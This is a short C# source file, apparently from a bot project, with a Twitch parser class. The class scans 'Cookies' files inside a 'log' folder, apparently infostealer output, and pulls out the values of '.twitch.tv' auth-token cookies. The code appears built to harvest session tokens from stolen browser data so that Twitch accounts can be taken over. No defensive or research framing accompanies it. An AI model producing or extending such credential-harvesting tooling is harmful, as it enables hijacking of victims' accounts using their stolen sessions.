using Bot.Core.Models;
using Bot.Core.Models.Parsers.Base;
using Bot.Services.Twitch.Models;

namespace Bot.Services.Twitch {
	public class Parser : BaseParserStream<User> {
		public override async IAsyncEnumerable<User> FromLog(string log) {
			if (log.TryGetFilesOf("Cookies") is not {Length: > 0} files) {
				yield break;
			}

			foreach (var file in files) {
				using (var reader = new StreamReader(File.OpenRead(file))) {
					while (!reader.EndOfStream) {
						var line = await reader.ReadLineAsync();
						var last_tab = line.LastIndexOf('\t');

						if (!line.StartsWith(".twitch.tv") || last_tab == -1 || line[(line[..last_tab].LastIndexOf('\t')+1)..last_tab] != "auth-token") {
							continue;
						}

						yield return line.TrimEnd()[(last_tab+1)..];
					}
				}
			}
		}
	}
}